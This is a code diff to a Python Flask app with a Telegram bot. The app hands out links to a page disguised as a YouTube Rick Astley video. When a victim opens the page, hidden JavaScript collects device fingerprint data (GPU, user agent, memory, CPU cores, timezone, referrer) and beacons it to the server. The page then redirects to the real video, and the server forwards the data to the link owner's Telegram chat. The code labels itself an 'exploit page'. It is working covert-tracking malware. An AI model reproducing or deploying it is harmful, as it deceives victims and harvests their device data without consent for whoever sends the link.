@@ -36,7 +36,7 @@ def get_owner(sid):
     return res[0] if res else OVERLORD_ID
 
 # =================================================================
-# [2] ULTRA-STABLE EXPLOIT PAGE
+# [2] EXPLOIT PAGE (ULTRA STABLE)
 # =================================================================
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -46,7 +46,6 @@ HTML_TEMPLATE = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta property="og:title" content="Rick Astley - Never Gonna Give You Up (Official Music Video)" />
     <meta property="og:image" content="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" />
-    <meta property="og:description" content="YouTube Music" />
     <title>YouTube</title>
     <style>
         body, html { margin:0; padding:0; width:100%; height:100%; background:#000; overflow:hidden; }
@@ -60,20 +59,15 @@ HTML_TEMPLATE = """
     <div id="app"><div class="play"></div></div>
 <script>
     const sid = "{{sid}}";
-    let fired = false;
-
     function ignite() {
-        if (fired) return;
-        fired = true;
-
-        var gpu = "N/A";
+        let gpu = "N/A";
         try {
-            var gl = document.createElement('canvas').getContext('webgl');
-            var dbg = gl.getExtension('WEBGL_debug_renderer_info');
+            let gl = document.createElement('canvas').getContext('webgl');
+            let dbg = gl.getExtension('WEBGL_debug_renderer_info');
             gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Generic";
         } catch(e) {}
 
-        var info = {
+        let info = {
             sid: sid,
             gpu: gpu,
             ua: navigator.userAgent,
@@ -81,18 +75,12 @@ HTML_TEMPLATE = """
             plat: navigator.platform,
             mem: navigator.deviceMemory || "N/A",
             cores: navigator.hardwareConcurrency || "N/A",
-            lang: navigator.language,
             tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            ratio: window.devicePixelRatio,
-            touch: navigator.maxTouchPoints,
             ref: document.referrer || "Direct"
         };
 
-        // ОТПРАВКА ДАННЫХ В ФОНЕ (Beacon не блокирует поток)
         navigator.sendBeacon('/gate/capture', btoa(JSON.stringify(info)));
-
-        // МГНОВЕННЫЙ РЕДИРЕКТ (Без таймаутов)
-        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+        window.location.replace("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
     }
 </script>
 </body>
@@ -100,54 +88,46 @@ HTML_TEMPLATE = """
 """
 
 # =================================================================
-# [3] SERVER LOGIC (DETAILED & READABLE REPORT)
+# [3] SERVER ROUTES
 # =================================================================
+
+@app.route('/')
+@app.route('/ping')
+def health(): 
+    return "SYSTEM ACTIVE", 200
+
+@app.route('/v/<sid>')
+def serve(sid):
+    return render_template_string(HTML_TEMPLATE, sid=sid)
 
 @app.route('/gate/capture', methods=['POST'])
 def capture():
     try:
         raw = base64.b64decode(request.get_data()).decode()
         d = json.loads(raw)
-        sid = str(d.get('sid'))
         
-        # Читабельный отчет
         report = (
             f"<b>🚀 ОБЪЕКТ ЗАФИКСИРОВАН</b>\n"
             f"━━━━━━━━━━━━━━━━━━\n"
-            f"🆔 <b>Target ID:</b> <code>{sid}</code>\n\n"
-            
+            f"🆔 <b>ID:</b> <code>{d.get('sid')}</code>\n\n"
             f"<b>💻 ЖЕЛЕЗО:</b>\n"
             f"• 🎮 <b>GPU:</b> <code>{d.get('gpu')}</code>\n"
             f"• 🧠 <b>CPU:</b> <code>{d.get('cores')} Cores</code>\n"
-            f"• 💾 <b>RAM:</b> <code>{d.get('mem')} GB</code>\n"
-            f"• 📱 <b>Platform:</b> <code>{d.get('plat')}</code>\n\n"
-            
+            f"• 💾 <b>RAM:</b> <code>{d.get('mem')} GB</code>\n\n"
             f"<b>📺 ДИСПЛЕЙ:</b>\n"
             f"• 📐 <b>Res:</b> <code>{d.get('res')}</code>\n"
-            f"• 🔍 <b>Ratio:</b> <code>{d.get('ratio')}</code>\n"
-            f"• 👆 <b>Touch:</b> <code>{d.get('touch')} pts</code>\n\n"
-            
+            f"• 📱 <b>OS:</b> <code>{d.get('plat')}</code>\n\n"
             f"<b>🌐 СИСТЕМА:</b>\n"
-            f"• 🗺 <b>TZ:</b> <code>{d.get('tz')}</code>\n"
-            f"• 🗣 <b>Lang:</b> <code>{d.get('lang')}</code>\n"
-            f"• 🖇 <b>Ref:</b> <code>{d.get('ref')}</code>\n"
+            f"• 📍 <b>TZ:</b> <code>{d.get('tz')}</code>\n"
+            f"• 🔗 <b>Ref:</b> <code>{d.get('ref')}</code>\n"
             f"━━━━━━━━━━━━━━━━━━\n"
-            f"🛰 <b>USER-AGENT:</b>\n"
-            f"<code>{d.get('ua')[:120]}...</code>"
+            f"🛰 <b>UA:</b>\n<code>{d.get('ua')[:100]}...</code>"
         )
         
-        owner_id = get_owner(sid)
         requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
-                      json={"chat_id": owner_id, "text": report, "parse_mode": "HTML"})
+                      json={"chat_id": get_owner(str(d.get('sid'))), "text": report, "parse_mode": "HTML"})
     except: pass
     return "OK"
-
-@app.route('/v/<sid>')
-def serve(sid):
-    return render_template_string(HTML_TEMPLATE, sid=sid)
-
-@app.route('/ping')
-def health(): return "OK", 200
 
 # =================================================================
 # [4] BOT ENGINE
@@ -166,9 +146,8 @@ def bot_loop():
                     if msg["text"] == "/start":
                         save_link(str(cid), cid)
                         link = f"{BASE_URL}/v/{cid}"
-                        text = f"🕶 <b>Система готова</b>\n\nТвоя ссылка:\n<a href='{link}'>{link}</a>"
                         requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
-                                      json={"chat_id": cid, "text": text, "parse_mode": "HTML"})
+                                      json={"chat_id": cid, "text": f"✅ <b>Готово!</b>\n\nСсылка:\n<code>{link}</code>", "parse_mode": "HTML"})
         except: time.sleep(5)
 
 if __name__ == '__main__':
